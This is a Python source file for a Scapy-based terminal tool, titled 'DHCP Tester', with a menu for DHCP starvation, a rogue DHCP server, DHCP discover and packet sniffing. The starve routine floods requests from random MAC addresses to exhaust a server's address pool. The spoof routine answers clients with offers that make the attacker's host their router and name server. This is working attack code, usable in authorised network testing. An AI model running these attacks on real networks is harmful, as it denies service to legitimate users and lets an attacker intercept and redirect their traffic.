#!/usr/bin/env python3
from argparse import ArgumentParser, Namespace
from scapy.all import (
    sniff,
    sendp,
    Ether,
    get_if_hwaddr,
    IP,
    UDP,
    BOOTP,
    DHCP,
    RandString,
    RandInt,
)
from threading import Thread, Event
from time import sleep
from datetime import datetime
from ipaddress import IPv4Address, IPv4Network
import curses
import os
import socket, struct
import re
import subprocess


class DhcpStarve:
    def __init__(self):
        """Preparation"""
        self.starvedIPs = []
        self.stop_sniffer = Event()  # to stop scapy sniff in method listen()

    def listen(self):
        """Sniff for dhcp packets."""
        sniff(
            filter="udp and (port 67 or port 68)",
            prn=self.handle_dhcp,
            store=0,
            stop_filter=self.should_stop_sniffer,
        )

    def should_stop_sniffer(self, packet):
        """Sets Event to stop scapy sniff method"""
        return self.stop_sniffer.isSet()  # to stop scapy sniff in method listen()

    def handle_dhcp(self, pkt):
        """Reacts to dhcp response."""
        if pkt[DHCP]:
            timestamp = "\n{} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            if pkt[DHCP].options[0][1] == 5:  # 5 is DHCPACK
                self.starvedIPs.append(pkt[IP].dst)
                print(
                    "{} ######{} registered (GOT ACK):######\n{}".format(
                        timestamp, pkt[IP].dst, pkt[DHCP].options
                    )
                )
            elif pkt[DHCP].options[0][1] == 6:  # 6 is DHCPNAK
                print(
                    "{} ######DHCP NAK:###### \n{}".format(timestamp, pkt[DHCP].options)
                )
            elif pkt[DHCP].options[0][1] == 2:  # 2 is DHCPOFFER
                print(
                    "{} ######DHCP OFFER:###### \n{}".format(
                        timestamp, pkt[DHCP].options
                    )
                )
            elif pkt[DHCP].options[0][1] == 3:  # 3 is DHCPREQUEST
                print(
                    "{} ######DHCP REQUEST:###### \n{}".format(
                        timestamp, pkt[DHCP].options
                    )
                )
            elif pkt[DHCP].options[0][1] == 1:  # 1 is DHCPDISCOVER
                print(
                    "{} ######DHCP DISCOVER:###### \n{}".format(
                        timestamp, pkt[DHCP].options
                    )
                )
            else:
                print("{} DHCP with options: {}".format(timestamp, pkt[DHCP].options))

        else:
            return False

    def _sniff_wrapper(sendPacketMethod):
        """Launches sniffing process around another passed method"""

        def wrapper(self, *args, **kwargs):
            listenProcess = Thread(target=self.listen)
            listenProcess.start()
            sleep(0.5)
            sendPacketMethod(self, *args, **kwargs)
            sleep(0.5)
            self.stop_sniffer.set()  # to stop scapy sniff in method listen()
            input("\nPress Enter to come back to menu.")

        return wrapper

    @_sniff_wrapper
    def discover(self):
        """Use method to send dhcp discover."""
        # craft DHCP DISCOVER
        dhcpDiscover = Ether(src=LOCALMAC, dst="ff:ff:ff:ff:ff:ff")
        dhcpDiscover /= IP(src="0.0.0.0", dst="255.255.255.255")
        dhcpDiscover /= UDP(dport=67, sport=68)
        dhcpDiscover /= BOOTP(chaddr=LOCALMACRAW, xid=RandInt())
        dhcpDiscover /= DHCP(options=[("message-type", "discover"), "end"])

        sendp(dhcpDiscover, iface=LOCALIFACE)

    @_sniff_wrapper
    def starve(self, startIP, limit):
        """Generate DHCP requests in loop"""
        for requestedIP in self.nextIP(startIP, limit):
            dhcpRequest = Ether(src=LOCALMAC, dst="ff:ff:ff:ff:ff:ff")
            dhcpRequest /= IP(src="0.0.0.0", dst="255.255.255.255")
            dhcpRequest /= UDP(dport=67, sport=68)
            dhcpRequest /= BOOTP(
                chaddr=RandString(12, b"0123456789abcdef"), xid=RandInt()
            )
            dhcpRequest /= DHCP(
                options=[
                    ("message-type", "request"),
                    ("requested_addr", requestedIP),
                    ("server_id", "192.168.31.1"),
                    "end",
                ]
            )
            sendp(dhcpRequest, iface=LOCALIFACE)
            print("Requesting for IP: {}".format(requestedIP))
            sleep(0.5)
        print("\nRegistered IPs during this session: {}".format(self.starvedIPs))

    def spoofing(self, startPoolIP):
        """Starts fake DHCP server"""
        self.poolIP = startPoolIP
        IPpoolGenerator = self.nextIP(startPoolIP, 100)

        def spoof_handle_dhcp(pkt):
            """Reacts to dhcp packet from spoof_listen() method """
            if pkt[DHCP].options[0][1] == 1:  # if DHCP DISCOVER
                print(
                    "\n{} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), end=""
                )
                print(" ######Received DISCOVER:######")
                print(pkt[DHCP].options)
                print(
                    "\n{} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), end=""
                )
                print(" ######Sending OFFER:######")
                self.offer(LOCALIP, self.poolIP, "255.255.255.0", pkt)
            elif pkt[DHCP].options[0][1] == 3:  # if DHCP REQUEST
                print(
                    "\n{} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), end=""
                )
                print(" ######Received REQUEST:######")
                print(pkt[DHCP].options)
                print(
                    "\n{} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), end=""
                )
                print(" ######Sending ACK:######")
                self.dhcpack(LOCALIP, self.poolIP, "255.255.255.0", pkt)
                self.poolIP = next(
                    IPpoolGenerator
                )  # change to next client IP if one is registered

        def spoof_listen():
            """Sniff for dhcp packets."""
            sniff(
                filter="udp and (port 67 or port 68)",
                prn=spoof_handle_dhcp,
                store=0,
                stop_filter=self.should_stop_sniffer,
            )

        listenProcess = Thread(target=spoof_listen)
        listenProcess.start()
        print("Waiting for DHCP DISCOVER PACKETS...\n")
        input("Press Enter to stop and come back to menu.\n")
        self.stop_sniffer.set()

    def offer(self, srcIP, client_ip, mask, discoverPkt):
        """Generate DHCP offer packet"""
        dhcpOffer = Ether(src=LOCALMAC, dst=discoverPkt[Ether].src)
        dhcpOffer /= IP(src=srcIP, dst="255.255.255.255")
        dhcpOffer /= UDP(dport=68, sport=67)
        dhcpOffer /= BOOTP(
            op=2,
            chaddr=bytes.fromhex(discoverPkt[Ether].src.replace(":", "")),
            yiaddr=client_ip,
            siaddr=srcIP,
            giaddr=srcIP,
            xid=discoverPkt[BOOTP].xid,
        )
        dhcpOffer /= DHCP(
            options=[
                ("message-type", "offer"),
                ("server_id", srcIP),
                ("lease_time", 43200),
                ("renewal_time", 21600),
                ("rebinding_time", 37800),
                ("subnet_mask", mask),
                ("broadcast_address", "192.168.56.255"),
                ("router", srcIP),
                ("name_server", srcIP),
                "end",
            ]
        )
        sendp(dhcpOffer, iface=LOCALIFACE)
        print(dhcpOffer[DHCP].options)

    def dhcpack(self, srcIP, client_ip, mask, requestPkt):
        """Generate DHCP request packet"""

        net = IPv4Network(srcIP + "/" + mask, False)
        broadcastIP = str(net.broadcast_address)

        dhcpack = Ether(src=LOCALMAC, dst=requestPkt[Ether].src)
        dhcpack /= IP(src=srcIP, dst="255.255.255.255")
        dhcpack /= UDP(dport=68, sport=67)
        dhcpack /= BOOTP(
            op=2,
            chaddr=bytes.fromhex(requestPkt[Ether].src.replace(":", "")),
            yiaddr=client_ip,
            siaddr=srcIP,
            giaddr=srcIP,
            xid=requestPkt[BOOTP].xid,
        )
        dhcpack /= DHCP(
            options=[
                ("message-type", "ack"),
                ("server_id", srcIP),
                ("lease_time", 43200),
                ("renewal_time", 21600),
                ("rebinding_time", 37800),
                ("subnet_mask", mask),
                ("broadcast_address", broadcastIP),
                ("router", srcIP),
                ("name_server", srcIP),
                "end",
            ]
        )
        sendp(dhcpack, iface=LOCALIFACE)
        print(dhcpack[DHCP].options)

    @_sniff_wrapper
    def sniffing(self):
        """Just snffing with _sniff_wrapper method """
        print("Starting sniffing for DHCP packets on interface: {}".format(LOCALIFACE))
        input("Press Enter to stop\n")

    def nextIP(self, startIP, limit):
        """Provides next ip addresses from some start IP, number of given addresses is limited"""
        for i in range(limit):
            try:
                ip = IPv4Address(startIP) + i
            except Exception as e:
                print(e)
                break
            yield IPv4Address(startIP) + i


class Menu:
    """Menu made with curses"""

    def __init__(self, menuItems):
        """Declaration of strings"""
        self.title = "Testing tool based on Scapy"
        self.menuItemsHint = "Choose an option or press q to quit:"
        self.menuItems = menuItems
        self.subtitle = "v0.92 , github.com/jarekj9/scapy_dhcp_tester"
        try:
            curses.wrapper(self.draw_menu)
        except curses.error as e:
            print(e, "\nMenu draw error\nIs terminal height > 20 and width > 65 ?")
            os._exit(0)

    def draw_menu(self, stdscr):
        """Draws menu with curses"""
        key = 0
        self.menuHighlight = 0
        self.stdscr = stdscr
        # Clear and refresh the screen for a blank canvas
        self.stdscr.clear()
        self.stdscr.refresh()
        curses.curs_set(0)  # hide cursor

        # Start colors in curses
        curses.start_color()
        curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_BLACK, curses.COLOR_WHITE)
        curses.init_pair(
            4, curses.COLOR_BLACK, curses.COLOR_GREEN
        )  # highlighted menu line

        # Initialization
        self.stdscr.clear()
        height, width = self.stdscr.getmaxyx()
        # import pdb; pdb.set_trace()

        while key != ord("q"):
            # Centering calculations
            self.start_x_title = int(
                (width // 2) - (len(self.title) // 2) - len(self.title) % 2
            )
            start_x_subtitle = int(
                (width // 2) - (len(self.subtitle) // 2) - len(self.subtitle) % 2
            )
            self.start_y = int((height // 2) - 10)

            # menu actions:
            if key == curses.KEY_DOWN and self.menuHighlight < len(self.menuItems) - 1:
                self.menuHighlight += 1
            elif key == curses.KEY_UP and self.menuHighlight > 0:
                self.menuHighlight -= 1
            if key == 10 and self.menuHighlight == 0:  # 10 is ENTER
                self.choose_starving()
            if key == 10 and self.menuHighlight == 1:
                self.choose_spoofing()
            if key == 10 and self.menuHighlight == 2:
                self.choose_discover()
            if key == 10 and self.menuHighlight == 3:
                self.choose_sniffing()

            # print big ascii title if screen is big enough
            if height > 20 and width > 110:
                for y, line in enumerate(ASCIITITLE.splitlines(), 2):
                    self.stdscr.addstr(self.start_y + y, self.start_x_title - 35, line)

            # print texts
            self.stdscr.attron(curses.color_pair(2))
            self.stdscr.attron(curses.A_BOLD)
            self.stdscr.addstr(self.start_y, self.start_x_title, self.title)
            self.stdscr.attroff(curses.color_pair(2))
            self.stdscr.attroff(curses.A_BOLD)

            self.stdscr.addstr(self.start_y + 2, self.start_x_title, self.menuItemsHint)

            for index, line in enumerate(self.menuItems):  # display menu items
                if index == self.menuHighlight:
                    self.stdscr.attron(curses.color_pair(4))
                self.stdscr.addstr(self.start_y + index + 4, self.start_x_title, line)
                if index == self.menuHighlight:
                    self.stdscr.attroff(curses.color_pair(4))

            # Print interface information
            self.stdscr.attron(curses.color_pair(1))
            self.stdscr.addstr(
                self.start_y + len(self.menuItems) + 6,
                self.start_x_title,
                "Using interface (can be set with cli arguments):",
            )
            self.stdscr.attroff(curses.color_pair(1))
            self.stdscr.addstr(
                self.start_y + len(self.menuItems) + 7,
                self.start_x_title,
                "NIC: {}".format(LOCALIFACE),
            )
            self.stdscr.addstr(
                self.start_y + len(self.menuItems) + 8,
                self.start_x_title,
                "IP: {}".format(LOCALIP),
            )
            self.stdscr.addstr(
                self.start_y + len(self.menuItems) + 9,
                self.start_x_title,
                "MAC: {}".format(REQUESTMAC),
            )

            self.stdscr.addstr(
                self.start_y + len(self.menuItems) + 11,
                self.start_x_title,
                "-" * len(self.subtitle),
            )
            self.stdscr.addstr(
                self.start_y + len(self.menuItems) + 12,
                self.start_x_title,
                self.subtitle,
            )

            # refresh and wait for input
            self.stdscr.refresh()
            key = self.stdscr.getch()
        curses.endwin()
        os._exit(0)

    def string_input(self, stdscr, x, y, prompt):
        """Displays prompt and returns user input (on x/y coordinates)"""
        curses.echo()
        self.stdscr.addstr(y, x, prompt)
        self.stdscr.refresh()
        input = self.stdscr.getstr(y, x + len(prompt), 20)
        self.stdscr.move(y, x)
        self.stdscr.clrtoeol()
        return input

    def choose_starving(self):
        """Initiate dhcp Starve menu option"""
        startIP = self.string_input(
            self.stdscr,
            self.start_x_title + 15,
            self.start_y + self.menuHighlight + 4,
            "Enter start IP: ",
        )
        while not re.search(REGEX_IP, startIP.decode()):
            startIP = self.string_input(
                self.stdscr,
                self.start_x_title + 15,
                self.start_y + self.menuHighlight + 4,
                "Wrong IP, enter start IP: ",
            )
        limit = self.string_input(
            self.stdscr,
            self.start_x_title + 15,
            self.start_y + self.menuHighlight + 4,
            "Enter limit of IPs: ",
        )
        while not re.search(r"[0-9]+", limit.decode()):
            limit = self.string_input(
                self.stdscr,
                self.start_x_title + 15,
                self.start_y + self.menuHighlight + 4,
                "Wrong limit, enter limit of IPs: ",
            )
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.starve(startIP.decode(), int(limit))

    def choose_spoofing(self):
        """Initiate dhcp spoofing menu option"""
        startPoolIP = self.string_input(
            self.stdscr,
            self.start_x_title + 15,
            self.start_y + self.menuHighlight + 4,
            "Enter pool start IP: ",
        )
        while not re.search(REGEX_IP, startPoolIP.decode()):
            startPoolIP = self.string_input(
                self.stdscr,
                self.start_x_title + 15,
                self.start_y + self.menuHighlight + 4,
                "Wrong IP, enter pool start IP: ",
            )
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.spoofing(startPoolIP.decode())

    def choose_discover(self):
        """Initiate dhcp discover menu option"""
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.discover()

    def choose_sniffing(self):
        """Initiate dhcp sniff menu option"""
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.sniffing()


def auto_detect_network():
    """Read the default gateway directly from /proc, returns dict {'defGW':.., 'dev':.., 'GWmac':.., 'mac':.., 'ip':..}"""
    subprocess.run(
        ["ping", "-c", "1", "4.2.2.2"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )  # to get some ARP entry for default gateway
    output = {}
    # Default gateway ip
    try:
        with open("/proc/net/route") as fh:
            for line in fh:
                fields = line.strip().split()
                if fields[1] != "00000000" or not int(fields[3], 16) & 2:
                    continue
                output.update(
                    {"defGW": socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))}
                )
    except Exception as e:
        print("Did not find default gateway ip in /proc/net/route")
    # Interface name and MAC of default gateway
    if output.get("defGW"):
        try:
            with open("/proc/net/arp") as fh:
                for line in fh:
                    if output.get("defGW") == line.split()[0]:
                        output.update({"dev": line.split()[5].strip()})
                        output.update({"GWmac": line.split()[3]})
                        break
        except Exception as e:
            print("Did not find default gateway interface and its MAC in /proc/net/arp")
            print(e.args)
    else:
        try:
            dev = os.listdir("/sys/class/net")[0]
            output.update({"dev": dev})
        except Exception as e:
            print("Did not find any interface in /sys/class/net/")
            print(e.args)
    # Interface MAC
    if output.get("dev"):
        try:
            with open("/sys/class/net/{}/address".format(output.get("dev"))) as fh:
                for line in fh:
                    output.update({"mac": line.strip()})
        except Exception as e:
            print(
                "Did not find interface mac address in /sys/class/net/{}/address".format(
                    output.get("dev")
                )
            )
            print(e.args)
        # Interface IP
        try:
            ipcmd = (
                subprocess.run(
                    ["ifconfig", output.get("dev")],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                .stdout.decode()
                .split("\n")
            )
            ip = "".join([line.split()[1] for line in ipcmd if "broadcast" in line])
            output.update({"ip": ip})
        except Exception as e:
            print("Did not find IP in ifconfig")
            print(e.args)

    return output


def configuration():
    """Sets ip, mac, interface values"""
    network_data = auto_detect_network()  # auto detection to set default values
    parser = ArgumentParser(
        description="Needs to run as root. \
    Program will try to autodetect network interface, \
    IP and MAC, but you may specify it with arguments during launch."
    )

    parser.add_argument(
        "--dev", default=network_data.get("dev"), help="Interface name, example: eth0"
    )
    parser.add_argument(
        "--ip",
        default=network_data.get("ip"),
        help="Local interface IP address, example: 192.168.1.10",
    )
    parser.add_argument(
        "--mac",
        default=network_data.get("mac"),
        help="Local interface MAC address, example: 84:3a:4b:23:cb:3c",
    )
    args = parser.parse_args()

    print(args)
    for arg in vars(args).values():
        if not arg:
            print(
                "\nFailed to autodetect network nic name, mac, ip.\n"
                + 'Please use "-h" flag to check arguments and then specify them manually'
            )
            exit(1)

        if not re.search(REGEX_IP, vars(args).get("ip")):
            print("This is not a valid IP address.")
            exit(1)
        if not re.search(REGEX_MAC, vars(args).get("mac")):
            print(
                "This is not a valid MAC address. Use a colon separated MAC, for example: 84:3a:4b:23:cb:3c"
            )
            exit(1)
        if vars(args).get("dev") not in os.listdir("/sys/class/net"):
            print(
                "Wrong interface name. The name should be exactly like in /sys/class/net/ or in ifconfig. "
            )
            exit(1)
    return args


ASCIITITLE = """
    ___        ___   ___     
   /   \/\  /\/ __\ / _ \    
  / /\ / /_/ / /   / /_)/    
 / /_// __  / /___/ ___/     
/___,'\/ /_/\____/\/         
                             
 _____          _            
/__   \___  ___| |_ ___ _ __ 
  / /\/ _ \/ __| __/ _ \ '__|
 / / |  __/\__ \ ||  __/ |   
 \/   \___||___/\__\___|_|   
"""
# configuration constants
REGEX_IP = r"^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
REGEX_MAC = r"^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$"
if __name__ == "__main__":
    arguments = configuration()
else:
    arguments = Namespace(
        dev="wlo1", ip="192.168.31.23", mac="84:3a:4b:23:cb:3c"
    )  # for pytest
LOCALIFACE = arguments.dev
REQUESTMAC = arguments.mac
LOCALIP = arguments.ip
MYHOSTNAME = "host"
LOCALMAC = get_if_hwaddr(LOCALIFACE)
LOCALMACRAW = bytes.fromhex(REQUESTMAC.replace(":", ""))


def main():
    while 1:
        menuObj = Menu(
            ["DHCP Starve", "DHCP Spoof", "DHCP Discover", "Sniff for DHCP Packets"]
        )


if __name__ == "__main__":
    main()
